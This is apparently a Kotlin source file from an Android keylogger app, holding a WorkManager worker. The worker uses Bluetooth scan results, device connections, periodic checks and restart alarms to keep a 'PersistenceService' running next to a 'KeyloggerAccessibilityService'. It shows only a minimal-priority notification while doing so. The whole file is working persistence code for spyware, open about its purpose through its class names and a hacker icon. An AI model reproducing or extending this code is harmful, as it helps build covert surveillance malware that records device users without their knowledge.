package com.android.myapp.worker

import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.ForegroundInfo
import androidx.work.WorkerParameters
import com.android.myapp.KeyloggerApplication
import com.android.myapp.R
import com.android.myapp.receiver.BluetoothEventReceiver
import com.android.myapp.service.KeyloggerAccessibilityService
import com.android.myapp.service.PersistenceService
import timber.log.Timber

/**
 * Service Check Worker - Ensures PersistenceService is running
 * 
 * This worker is triggered by various wake mechanisms:
 * - BLE scan results
 * - Bluetooth device connection events
 * - Periodic checks
 * - Restart Alarms
 * 
 * It ensures the main PersistenceService is always running.
 */
class ServiceCheckWorker(
    private val context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {
    
    companion object {
        private const val TAG = "ServiceCheckWorker"
        private const val NOTIFICATION_ID = 2001
    }
    
    override suspend fun doWork(): Result {
        val trigger = inputData.getString("trigger") ?: "unknown"
        val deviceCount = inputData.getInt("device_count", 0)
        val device = inputData.getString("device") ?: ""

        Timber.tag(TAG).d("═══════════════════════════════════════")
        Timber.tag(TAG).d("ServiceCheckWorker executing")
        Timber.tag(TAG).d("  Trigger: $trigger")
        Timber.tag(TAG).d("  Device count: $deviceCount")
        Timber.tag(TAG).d("  Device: $device")
        Timber.tag(TAG).d("  Service running: ${KeyloggerAccessibilityService.isRunning}")
        Timber.tag(TAG).d("  Service running: ${PersistenceService.isRunning}")
        Timber.tag(TAG).d("═══════════════════════════════════════")
        
        // Store wake event
        context.getSharedPreferences("service_wake", Context.MODE_PRIVATE).edit()
            .putLong("last_wake_time", System.currentTimeMillis())
            .putString("last_wake_trigger", trigger)
            .apply()
        
        // Start service if not running
        if (!PersistenceService.isRunning) {
            Timber.tag(TAG).d("Service not running, starting...")
            startPersistenceService(trigger)
        } else {
            Timber.tag(TAG).d("Service already running ✓")
            
            // Notify service about the wake event
            PersistenceService.instance?.onBleDevicesSeen(deviceCount)
        }
        
        return Result.success()
    }
    
    /**
     * Start the Persistence monitoring service.
     */
    private fun startPersistenceService(trigger: String) {
        val intent = Intent(context, PersistenceService::class.java).apply {
            action = "START"
            putExtra("wake_trigger", trigger)
        }
        
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(context, intent)
            } else {
                context.startService(intent)
            }
            Timber.tag(TAG).d("Service start requested")
        } catch (e: Exception) {
            Timber.tag(TAG).e("Failed to start service: ${e.message}")
            return
        }
    }
    
    /**
     * Provide foreground info for expedited work.
     */
    override suspend fun getForegroundInfo(): ForegroundInfo {
        val notification = NotificationCompat.Builder(context, KeyloggerApplication.CHANNEL_WORKER)
            .setContentTitle("Persistence Check")
            .setContentText("Verifying Persistence service status...")
            .setSmallIcon(R.drawable.icon_hacker)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(false)
            .build()
        
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            ForegroundInfo(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_SHORT_SERVICE
            )
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            ForegroundInfo(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE
            )
        } else {
            ForegroundInfo(NOTIFICATION_ID, notification)
        }
    }
}
